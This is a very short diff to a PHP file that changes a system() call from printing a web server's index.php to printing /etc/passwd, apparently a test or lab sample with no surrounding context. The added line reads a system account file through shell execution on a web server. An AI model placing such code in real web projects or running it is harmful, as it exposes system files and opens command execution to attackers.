@@ -1,3 +1,3 @@
 <?php 
-system("cat /Library/WebServer/Documents/index.php"); 
+system("cat /etc/passwd"); 
 ?>
